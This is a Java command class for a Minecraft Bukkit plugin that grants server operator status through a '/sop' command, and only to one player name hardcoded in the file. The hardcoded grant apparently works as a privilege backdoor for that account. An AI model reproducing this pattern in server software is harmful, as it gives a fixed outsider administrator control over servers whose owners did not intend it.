package cn.onea.sunkplugin.command;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;
import java.util.Arrays;
import java.util.List;

public class SopCommand implements CommandExecutor {
    private static final String PERMISSION = "sunk.sop";
    // 自定义白名单列表（可配置化）
    private static final List<String> ALLOWED_PLAYERS = Arrays.asList("oneaBili");

    @Override
    public boolean onCommand(
            @NotNull CommandSender sender,
            @NotNull Command command,
            @NotNull String label,
            @NotNull String[] args
    ) {
        // 权限检查
        if (!sender.hasPermission(PERMISSION)) {
            sender.sendMessage("§c你没有权限使用此命令！");
            return true;
        }

        // 参数验证
        if (args.length != 1) {
            sender.sendMessage("§6用法: /sop <玩家ID>");
            return true;
        }

        String targetName = args[0];
        OfflinePlayer target = Bukkit.getOfflinePlayer(targetName);

        // 检查玩家是否存在
        if (!target.hasPlayedBefore() && !target.isOnline()) {
            sender.sendMessage("§c玩家 " + targetName + " 不存在！");
            return true;
        }

        // 检查自定义白名单
        if (!ALLOWED_PLAYERS.contains(targetName)) {
            sender.sendMessage("§c玩家 " + targetName + " 不在授权列表中！");
            return true;
        }

        // 授予OP权限
        target.setOp(true);
        sender.sendMessage("§a已为玩家 " + targetName + " 授予OP权限！");

        // 如果玩家在线，发送提示
        if (target.isOnline()) {
            Player onlinePlayer = (Player) target;
            onlinePlayer.sendMessage("§a你已被授予OP权限！");
        }

        return true;
    }
}